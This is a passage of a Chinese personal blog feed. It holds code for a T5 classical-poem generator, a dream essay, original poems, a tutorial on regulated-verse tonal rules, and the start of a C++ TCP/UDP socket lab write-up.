T5ForConditionalGeneration<br><span class="hljs-keyword">import</span> chinese_converter<br><br>MODEL_PATH = <span class="hljs-string">&quot;./Models/t5-poem-v2.1/simplet5-epoch-4-train-loss-3.4329-val-loss-3.4315&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PoemModel</span>(<span class="hljs-title class_ inherited__">SimpleT5</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">super</span>().__init__()<br>    <span class="hljs-variable language_">self</span>.device = torch.device(<span class="hljs-string">&quot;cuda&quot;</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">load_my_model</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-variable language_">self</span>.tokenizer = T5Tokenizer.from_pretrained(MODEL_PATH)<br>    <span class="hljs-variable language_">self</span>.model = T5ForConditionalGeneration.from_pretrained(MODEL_PATH)<br></code></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 有一些预先设定参数</span><br>AUTHOR_PROMPT = <span class="hljs-string">&quot;模仿：&quot;</span><br>TITLE_PROMPT = <span class="hljs-string">&quot;作诗：&quot;</span><br>EOS_TOKEN = <span class="hljs-string">&#x27;&lt;/s&gt;&#x27;</span><br><br>poem_model = PoemModel()<br>poem_model.load_my_model()<br>poem_model.model = poem_model.model.to(<span class="hljs-string">&#x27;cuda&#x27;</span>)<br><br>MAX_AUTHOR_CHAR = <span class="hljs-number">4</span><br>MAX_TITLE_CHAR = <span class="hljs-number">12</span><br>MIN_CONTENT_CHAR = <span class="hljs-number">10</span><br>MAX_CONTENT_CHAR = <span class="hljs-number">64</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">poem</span>(<span class="hljs-params">title_str, opt_author=<span class="hljs-literal">None</span>, model=poem_model,</span><br><span class="hljs-params">         is_input_traditional_chinese=<span class="hljs-literal">False</span>,</span><br><span class="hljs-params">         num_beams=<span class="hljs-number">100</span></span>):<br>  model.model = model.model.to(<span class="hljs-string">&#x27;cuda&#x27;</span>)<br>  <span class="hljs-keyword">if</span> opt_author:<br>    in_request = TITLE_PROMPT + title_str[:MAX_TITLE_CHAR] + EOS_TOKEN + AUTHOR_PROMPT + opt_author[:MAX_AUTHOR_CHAR]<br>  <span class="hljs-keyword">else</span>:<br>    in_request = TITLE_PROMPT + title_str[:MAX_TITLE_CHAR]<br>  <span class="hljs-keyword">if</span> is_input_traditional_chinese:<br>    in_request = chinese_converter.to_simplified(in_request)<br>  out = model.predict(in_request,<br>                      max_length=MAX_CONTENT_CHAR,<br>                      num_beams=num_beams)[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;，&quot;</span>)<br>                      <span class="hljs-comment"># logits_processor=LogitsProcessorList([rhyme_processor]))[0].replace(&quot;,&quot;, &quot;，&quot;)</span><br><br>  <br>  <span class="hljs-keyword">if</span> is_input_traditional_chinese:<br>    out = chinese_converter.to_traditional(out)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;標題： <span class="hljs-subst">&#123;in_request.replace(<span class="hljs-string">&#x27;&lt;/s&gt;&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)&#125;</span>\n詩歌： <span class="hljs-subst">&#123;out&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;标题： <span class="hljs-subst">&#123;in_request.replace(<span class="hljs-string">&#x27;&lt;/s&gt;&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>)&#125;</span>\n诗歌： <span class="hljs-subst">&#123;out&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> title <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;秋思&#x27;</span>, <span class="hljs-string">&#x27;佳人&#x27;</span>, <span class="hljs-string">&#x27;相思&#x27;</span>,<span class="hljs-string">&quot;幽梦&quot;</span>]:<br>  <span class="hljs-comment"># Empty author means general style</span><br>  <span class="hljs-keyword">for</span> author <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&quot;杜甫&quot;</span>, <span class="hljs-string">&quot;李白&quot;</span>, <span class="hljs-string">&quot;李清照&quot;</span>, <span class="hljs-string">&quot;苏轼&quot;</span>]:<br>    poem(title, author)<br>  <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure><h3 id="结论">结论</h3><p>微调mengzi-t5模型，使用唐诗宋词数据集训练了古诗生成模型，实现古诗生成。</p><p>slide见<ahref="https://github.com/symcreg/poem_generate/blob/main/slide.pptx">这里</a>。<br />实现效果在<ahref="https://github.com/symcreg/poem_generate/blob/main/presentation.mp4">这里</a>。<br />github地址：<ahref="https://github.com/symcreg/poem_generate">poem_generate</a><br />飞桨地址：<ahref="https://aistudio.baidu.com/projectdetail/8620151">test</a><br />主要参考（抄）了<ahref="https://github.com/hululuzhu/chinese-ai-writing-share">chinese-ai-writing-share</a></p><h3 id="参考">参考</h3><ol start="0" type="1"><li><a href="https://aistudio.baidu.com/overview">aistudio</a></li><li><ahref="https://github.com/chinese-poetry/chinese-poetry">chinese-poetry</a><br /></li><li><a href="https://hf-mirror.com">hf-mirror</a><br /></li><li><ahref="https://github.com/hululuzhu/chinese-ai-writing-share">chinese-ai-writing-share</a><br /></li><li><ahref="https://github.com/wangjiezju1988/aichpoem">aichpoem</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>模型训练</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>随笔记梦</title>
    <link href="/2024/11/26/%E9%9A%8F%E7%AC%94%E8%AE%B0%E6%A2%A6/"/>
    <url>/2024/11/26/%E9%9A%8F%E7%AC%94%E8%AE%B0%E6%A2%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="随笔记梦">随笔记梦</h1><p>霎时天摇地动，乾翻坤覆，六合迫临，四野俱寂。日及天心，耀光极明，若金虹贯空，若烈焰腾舞，五色斑斓，七彩绚烂，万象为之失辉。余心振荡不怡，魂惊魄散，神骇思移，恍惚兮若行至云端，缥缈兮如坠入乱流；迷离兮若踏及夜明，惶惑兮如置身于幻海茫茫。悚怛而起，余已涕泪满面。</p><p>梦者，真伪难辨；迷途，虚实莫测。天旋地转间，觉一切如镜中花，水中月，虽近在咫尺，却不可触。怔然滞目，心中寂寂。</p><h2 id="section">2024-11-30</h2><p>清风拂面，细雨如织。凄凄芳草，曳曳江荻。转眄无聚，步履无依。徙倚彷徨，洎乎幽苑。门阍轻掩，玉砌呈前。方至其间，见珠帘翠影，闻琴瑟悠悠。音符清丽，芳影翩翩。却听耳畔幽幽轻叹：“歧路兮莫徘徊，迷途兮何眷恋？君至此，奈所何？此生已矣，来世再续。”语毕，愁云蔽日，悲雨霏霏。弦断琴残，珠泪纵流。余顾盼身侧，空余烟波。萧萧风雨，独自凄凄。九天浩浩，无以容此身；宙宇茫茫，无以载此心。</p><p>于是天摇地动，乾翻坤覆，六合迫临，四野俱寂。日及天心，耀光极明，若金虹贯空，若烈焰腾舞，五色斑斓，七彩绚烂，万象失辉，应星不煜。余心振荡不怡兮，身战栗而局躅。魂惊魄摇，神骇精移，恍惚兮若行至云端，缥缈兮如坠入乱流；迷离兮若踏及夜明，惶惑兮如置身于幻海茫茫。镜中花碎，水底月沉。悚怛而起，余已涕泪满面。怔然滞目，心中寂寂。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>记梦</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>月堕阳升</title>
    <link href="/2024/11/24/%E6%9C%88%E5%A0%95%E9%98%B3%E5%8D%87/"/>
    <url>/2024/11/24/%E6%9C%88%E5%A0%95%E9%98%B3%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><center>月堕阳升</center><center>瞑夜昇晨晓，垂珠染霁虹。</center><center>新芽抽嫩柳，宿鸟望春风。</center><center>幽梦遗窗冷，残灯泣室空。</center><center>吟蛙愁月堕，舞燕盼阳升。</center>]]></content>
    
    
    <categories>
      
      <category>诗词</category>
      
    </categories>
    
    
    <tags>
      
      <tag>五律</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逐影随波</title>
    <link href="/2024/11/23/%E9%80%90%E5%BD%B1%E9%9A%8F%E6%B3%A2/"/>
    <url>/2024/11/23/%E9%80%90%E5%BD%B1%E9%9A%8F%E6%B3%A2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><center>逐影随波</center><center>去雁急逐影，浮萍任系波。</center><center>喧台常众和，何日静独歌？</center>]]></content>
    
    
    <categories>
      
      <category>诗词</category>
      
    </categories>
    
    
    <tags>
      
      <tag>五绝</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>旧梦新寒</title>
    <link href="/2024/11/22/%E6%97%A7%E6%A2%A6%E6%96%B0%E5%AF%92/"/>
    <url>/2024/11/22/%E6%97%A7%E6%A2%A6%E6%96%B0%E5%AF%92/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><center>旧梦新寒</center><center>几缕云烟散，一支孤叶来。</center><center>新寒侵旧梦，寂月隐空台。</center>]]></content>
    
    
    <categories>
      
      <category>诗词</category>
      
    </categories>
    
    
    <tags>
      
      <tag>五绝</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>诗词格律</title>
    <link href="/2024/11/22/%E8%AF%97%E8%AF%8D%E6%A0%BC%E5%BE%8B/"/>
    <url>/2024/11/22/%E8%AF%97%E8%AF%8D%E6%A0%BC%E5%BE%8B/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="诗的类别">诗的类别</h2><p>诗可以分为古诗、律诗、绝句三种。古诗、律诗、绝句又各分为五言、七言。五言就是每句五个字，七言就是每句七个字。</p><p>古体诗时按照古代的诗体来写的，没有一定的标准，可以说，凡是不受近体格律舒服的，都是古体诗。古体诗除了押韵之外不受任何格律的束缚，这是一种半自由体的诗。</p><p>近体诗以律诗为代表。律诗的韵、平仄、对仗都有许多讲究。有以下四个特点：<br />* 每首限定八句；<br />* 押平声韵；<br />* 每句的平仄都有规定；<br />* 每篇必须有对仗，对仗的位置也有规定。</p><p>超过八句的律诗，称为长律，长律也时近体诗。</p><p>绝句比律诗的字数少一半，即四句一首。</p><h2 id="律诗的韵">律诗的韵</h2><p>古人写律诗，时严格依照韵书来押韵的。在韵书里，平声分为上平声、下平声。平声字多，所以分为两卷，等于说平声上卷，平声下卷，没有别的意思。<br />上平声15韵：<br />　一东二冬三江四支五微六鱼七虞八齐九佳十灰十一真十二文十三元十四寒十五删</p><p>下平声15韵：<br />　一先二萧三肴四豪五歌六麻七阳八庚九青十蒸十一尤十二侵十三覃十三盐十五咸</p><p>东冬等字都只是韵的代表字。</p><p>五律第一句多数时不押韵的；七律第一句，多数是押韵的。由于第一句押韵与否是自由的，所以第一句的韵脚也可以不太严格，用邻近的韵也行。今天我们如果也写律诗，就不必拘泥古人的诗韵。不但首句用邻韵，就是其他的韵脚用邻韵，只要朗诵起来谐和，都是可以的。</p><h2 id="律诗的平仄">律诗的平仄</h2><p>平仄，这是律诗中最重要的因素。律诗的平仄规则，一直应用到后代的词曲。我们讲诗词的格律，主要就是讲平仄。</p><h3 id="一五律的平仄">（一）五律的平仄</h3><h4 id="仄起式">（1）仄起式</h4><h5 id="基本式">1 基本式</h5><p>仄仄平平仄，平平仄仄平。<br />平平平仄仄，仄仄仄平平。<br />仄仄平平仄，平平仄仄平。<br />平平平仄仄，仄仄仄平平。</p><h5 id="变式">2 变式</h5><p>将1的首句改为仄仄仄平平，其余不变即是仄起变式。<br />仄仄仄平平，平平仄仄平。<br />平平平仄仄，仄仄仄平平。<br />仄仄平平仄，平平仄仄平。<br />平平平仄仄，仄仄仄平平。</p><h4 id="平起式">（2）平起式</h4><h5 id="基本式-1">1 基本式</h5><p>平平平仄仄，仄仄仄平平。<br />仄仄平平仄，平平仄仄平。<br />平平平仄仄，仄仄仄平平。<br />仄仄平平仄，平平仄仄平。</p><h5 id="变式-1">2 变式</h5><p>将1的首句改为平平仄仄平，其余不变即是平起变式，但这种情况较少。<br />平平仄仄平，仄仄仄平平。<br />仄仄平平仄，平平仄仄平。<br />平平平仄仄，仄仄仄平平。<br />仄仄平平仄，平平仄仄平。</p><h3 id="二七律的平仄">（二）七律的平仄</h3><p>七律是五律的扩展，扩展的办法是在五字句的上面加一个两字的头。仄上加平，平上加仄。</p><h4 id="平仄脚">平仄脚</h4><p>五言仄起仄收： o o 仄仄平平仄<br />七言平起仄收：平平仄仄平平仄</p><h4 id="仄平脚">仄平脚</h4><p>五言平起平收： o o 平平仄仄平<br />七言仄起平收：仄仄平平仄仄平</p><h4 id="仄仄脚">仄仄脚</h4><p>五言平起仄收： o o 平平平仄仄<br />七言仄起仄收：仄仄平平平仄仄</p><h4 id="平平脚">平平脚</h4><p>五言仄起平收： o o 仄仄仄平平<br />七言平起平收：平平仄仄仄平平</p><p>由这四种类型的平仄错综变化，可以换成七律的四种格式。其实只有两种基本格式，其余两种不过在基本格式的基础上稍有变化罢了。</p><h4 id="仄起式-1">（1）仄起式</h4><h5 id="基本式-2">1 基本式</h5><p>仄仄平平仄仄平，平平仄仄仄平平。<br />平平仄仄平平仄，仄仄平平仄仄平。<br />仄仄平平平仄仄，平平仄仄仄平平。<br />平平仄仄平平仄，仄仄平平仄仄平。</p><h5 id="变式-2">2 变式</h5><p>第一句改为仄仄平平平仄仄，其余不变。<br />仄仄平平平仄仄，平平仄仄仄平平。<br />平平仄仄平平仄，仄仄平平仄仄平。<br />仄仄平平平仄仄，平平仄仄仄平平。<br />平平仄仄平平仄，仄仄平平仄仄平。</p><h4 id="平起式-1">（2）平起式</h4><h5 id="基本式-3">1 基本式</h5><p>平平仄仄仄平平，仄仄平平仄仄平。<br />仄仄平平平仄仄，平平仄仄仄平平。<br />平平仄仄平平仄，仄仄平平仄仄平。<br />仄仄平平平仄仄，平平仄仄仄平平。</p><h5 id="变式-3">2 变式</h5><p>第一句改为平平仄仄平平仄，其余不变。<br />平平仄仄平平仄，仄仄平平仄仄平。<br />仄仄平平平仄仄，平平仄仄仄平平。<br />平平仄仄平平仄，仄仄平平仄仄平。<br />仄仄平平平仄仄，平平仄仄仄平平。</p><h3 id="三粘对">（三）粘对</h3><p>对，就是平对仄，仄对平。也就是上文所说的：在对句中，平仄是对立的。五律的"对"，只有两副对联的形式，即：<br />（1 ）仄仄平平仄，平平仄仄平。<br />（2 ）平平平仄仄，仄仄仄平平。</p><p>七律的"对"，也只有两副对联的形式，即： （1）平平仄仄平平仄，仄仄平平仄仄平。<br />（2 ）仄仄平平平仄仄，平平仄仄仄平平。</p><p>如果首句用韵，则首联的平仄就不是完全对立的。由于韵脚的限制，也只能这样办.。这样，五律的首联成为：<br />（1 ）仄仄仄平平，平平仄仄平。或者是：<br />（2 ）平平仄仄平，仄仄仄平平。<br />七律的首联成为：<br />（1 ）平平仄仄仄平平，仄仄平平仄仄平。或者是：<br />（2 ）仄仄平平仄仄平，平平仄仄仄平平。</p><p>粘，就是平粘平，仄粘仄；后联出句第二字的平仄要跟前联对句第二字相一致。具体说来，要使第三句跟第二句相粘，第五句跟第四句相粘，第七句跟第六句相粘。<br />违反了粘的规则，叫做失粘；违反了对的规则，叫做失对。</p><h3 id="四孤平">（四）孤平</h3><p>孤平是律诗（包括长律、律绝）的大忌，所以诗人们在写律诗的时候，注意避免孤平。在词曲中用到同类句子的时候，也注意避免孤平。</p><p>在五言"平平仄仄平"这个句型中，第一字必须用平声；如果用了仄声字，就是犯了孤平。因为除了韵脚之外，只剩一个平声字了。七言是五言的扩展，所以在"仄仄平平仄仄平"这个句型中，第三字如果用了仄声，也叫犯孤平。</p><h3 id="五特定的一种平仄格式">（五）特定的一种平仄格式</h3><p>在五言"平平平仄仄"这个句型中，可以使用另一个格式，就是"平平仄平仄"；七言是五言的扩展，所以在七言"仄仄平平平仄仄"这个句型中，也可以使用另一个格式，就是"仄仄平平仄平仄"。这种格式的特点是：五言第三四两字的平仄互换位置，七言第五六两字的平仄互换位置。注意：在这种情况下，五言第一字、七言第三字必须用平声，不再是可平可仄的了。</p><h3 id="六拗救">（六）拗救</h3><p>凡平仄不依常格的句子，叫做拗句。律诗中如果多用拗句，就变成了古风式的律诗。前面一字用拗，后面还必须用"救"。所谓"救"，就是补偿。一般说来，前面该用平声的地方用了仄声，后面必须在适当的位置上补偿一个平声。下面的三种情况是比较常见的：<br />（a）在该用"平平仄仄平"的地方，第一字用了仄声，第三字补偿一个平声，以免犯孤平。这样就变成了"仄平平仄平"。七言则是由"仄仄平平仄仄平"换成"仄仄仄平平仄平"。这是本句自救。<br />（b）在该用"仄仄平平仄"的地方，第四字用了仄声（或三四两字都用了仄声），就在对句的第三字改用了平声来补偿。这样就成为"仄仄平仄仄，平平平仄平"。七言则成为"平平仄仄平仄仄，仄仄平平平仄平"。这是对句相救。<br />（c）在该用"仄仄平平仄"的地方，第四字没有用仄声，只是第三字用了仄声。七言则是第五字用了仄声。这是半拗，可救可不救，和（a ）（b ）的严格性稍有不同。</p><p>诗人们在运用（a ）的同时，常常在出句用（b ）或（c）。这样既构成本句自救，又构成对句相救。</p><h2 id="律诗的对仗">律诗的对仗</h2><p>词的分类是对仗的基础。古代诗人们在应用对仗时所分的词类，和今天语法上所分的词类大同小异，不过当时诗人们并没有给它们起一些语法术语罢了。依照律诗的对仗概括起来，词大约可以分为下列的九类：<br />1、名词 2、形容词 3、数词（数目字）4、颜色词 5、方位词6、动词 7、副词8、虚词 9、代词<br />同类的词相为对仗。我们应该特别注意四点：<br />（a ）数目自成一类，"孤""半"等字也算是数目。<br />（b ）颜色自成一类。<br />（c ）方位自成一类，主要是"东""西""南""北"等字。这三类词很少跟别的词相对。（d ）不及物动词常常跟形容词相对。<br />连绵字只能跟连绵字相对。连绵字当中又再分为名词连绵字（鸳鸯、鹦鹉等）。不同词性的连绵字一般还是不能相对。<br />专名只能与专名相对，最好是人名对人名，地名对地名。</p><p>古人把律诗的第一二两句叫做首联，第三四两句叫做颔联，第五六两句叫做颈联，第七八两句叫做尾联。对仗一般用在颔联和颈联，即第三四句和第五六句。首联的对仗是可用可不用的。首联用了对仗，并不因此减少中两联的对仗。</p>]]></content>
    
    
    <categories>
      
      <category>诗词</category>
      
    </categories>
    
    
    <tags>
      
      <tag>格律</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>experiment of socket</title>
    <link href="/2024/11/21/experiment-of-socket/"/>
    <url>/2024/11/21/experiment-of-socket/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>Sincerely recommend read this article on my <ahref="https://symcreg.github.io/2024/11/21/experiment-of-socket/">Blog</a>,the Blog will have a better reading experience.</p><p>And the code is on my <ahref="https://github.com/symcreg/experiment_socket">Github</a></p><h3 id="a.-the-experiment-purpose">A. The experiment purpose</h3><p>two computer hosts as server and client communicate with eachother.<br />With socket programmning respectively with TCP and UDP, realize thefollowing application:<br />1. client reads a line of characters (data) from its keyboard and sendsdata to server<br />2. server receives the data<br />3. server converts lowercase letters to uppercase letters , and sendsthe data to client<br />4. client receives the data and displays line on its screen</p><figure><img src="/img/experiment-of-socket/process.png" alt="process" /><figcaption aria-hidden="true">process</figcaption></figure><h3 id="b.-materials">B. Materials</h3><p>Hardware: Lenovo Legion R7000<br />Software: Windows11, Ubuntu18.04, Clion, Pycharm,VMware Workstation,c++, python<br />Network Configuration: Bridge Mode between virtual machine and physicalmachine</p><h3 id="c.-procedure">C. Procedure</h3><h4id="first-we-need-to-figure-out-the-ip-address-of-the-server-and-client.">0.First, we need to figure out the IP address of the server andclient.</h4><p>In windows, we can use 'ipconfig' to get the IP address of the serverand client while in linux, we can use ifconfig to get the IP address ofthe server and client.(In this experiment, the server is the physicalmachine and the client is the virtual machine, and the network mode isbridge mode)</p><p><img src="/img/experiment-of-socket/ipconfig.png"alt="ipconfig" /><br /><img src="/img/experiment-of-socket/ifconfig.png" alt="ifconfig" /></p><p>in this experiment, the IP address of the server is:10.136.12.124</p><p>and the IP address of the client is: 192.168.58.130</p><p>we choose 8080 as the port of the server.</p><p>use ping to check the connection between the server and theclient.</p><figure><img src="/img/experiment-of-socket/ping.png" alt="ping" /><figcaption aria-hidden="true">ping</figcaption></figure><p>if the ping is successful, we can start the socket programming.</p><h4 id="server-side">1. Server side</h4><h5 id="create-a-socket-with-the-socket-system-call.">1.1. Create asocket with the socket() system call.</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++">WORD version = <span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>WSADATA data;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(version, &amp;data) != <span class="hljs-number">0</span>) &#123;<br>    std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to start WSA&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">this</span>-&gt;port_ = port;<br><span class="hljs-comment">//protocol: 0 means TCP, 1 means UDP</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">this</span>-&gt;server_fd_ = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">this</span>-&gt;server_fd_ = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;server_fd_ == <span class="hljs-number">-1</span>) &#123;<br>    std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to create socket&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">this</span>-&gt;server_addr_.sin_family = AF_INET; <span class="hljs-comment">//sin means socket internet</span><br><span class="hljs-keyword">this</span>-&gt;server_addr_.sin_addr.s_addr = INADDR_ANY;<br><span class="hljs-keyword">this</span>-&gt;server_addr_.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-keyword">this</span>-&gt;port_);<br><br></code></pre></td></tr></table></figure><p>we set the verstion of the socket to 2.2, and start the WSA, thencreate a socket with the socket() system call. We can choose theprotocol of the socket, 0 means TCP, 1 means UDP.</p><p>parameters of the socket() system call:<br />- domain: AF_INET(ipv4), AF_INET6, AF_UNIX, AF_UNSPEC<br />- type: SOCK_STREAM(tcp), SOCK_DGRAM(udp), SOCK_RAW,SOCK_SEQPACKET<br />- protocol: 0 means auto choose the protocol</p><p>Then we set the server address, the family is AF_INET, the address isINADDR_ANY, and the port is the port we choose(8080).</p><p>fd means file descriptor, which is an integer that is used to accessthe socket.</p><h5id="bind-the-socket-to-an-address-using-the-bind-system-call.-for-a-server-socket-on-the-internet-an-address-consists-of-a-port-number-on-the-host-machine.">1.2.Bind the socket to an address using the bind() system call. For a serversocket on the Internet, an address consists of a port number on the hostmachine.</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">this</span>-&gt;server_addr_.sin_family = AF_INET; <span class="hljs-comment">//sin means socket internet</span><br><span class="hljs-keyword">this</span>-&gt;server_addr_.sin_addr.s_addr = INADDR_ANY;<br><span class="hljs-keyword">this</span>-&gt;server_addr_.sin_port = <span class="hljs-built_in">htons</span>(<span class="hljs-keyword">this</span>-&gt;port_);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">bind</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;<span class="hljs-keyword">this</span>-&gt;server_addr_, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;server_addr_)) &lt; <span class="hljs-number">0</span>) &#123;<br>    std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to bind socket&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">this</span>-&gt;client_addr_len_ = <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">this</span>-&gt;client_addr_);<br></code></pre></td></tr></table></figure><p>we set the server address again, then bind the socket to the addresswe set before. If the bind() system call fails, we will exit theprogram.</p><h5 id="listen-for-connections-with-the-listen-system-call.">1.3. Listenfor connections with the listen() system call.</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">0</span>) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[TCP]&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">listen</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, <span class="hljs-number">10</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to listen&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[UDP]&quot;</span> &lt;&lt; std::endl;<br>&#125;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;Server started on port &quot;</span> &lt;&lt; <span class="hljs-keyword">this</span>-&gt;port_ &lt;&lt; std::endl;<br></code></pre></td></tr></table></figure><p>if the protocol is TCP, we will listen for connections with thelisten() system call, the second parameter is the maximum length of thequeue of pending connections, if the queue is full, the client will berefused to connect.</p><p>if the protocol is UDP, we will just print "[UDP]" because UDP isconnectionless.</p><h5id="accept-a-connection-with-the-accept-system-call.-this-call-typically-blocks-until-a-client-connects-with-the-server.">1.4.Accept a connection with the accept() system call. This call typicallyblocks until a client connects with the server.</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>-&gt;protocol_ == <span class="hljs-number">1</span>)&#123;<br>    std::cerr &lt;&lt; <span class="hljs-string">&quot;UDP does not support accept&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">this</span>-&gt;client_fd_ = ::<span class="hljs-built_in">accept</span>(<span class="hljs-keyword">this</span>-&gt;server_fd_, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_, &amp;<span class="hljs-keyword">this</span>-&gt;client_addr_len_);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;client_fd_ &lt; <span class="hljs-number">0</span>) &#123;<br>    std::cerr 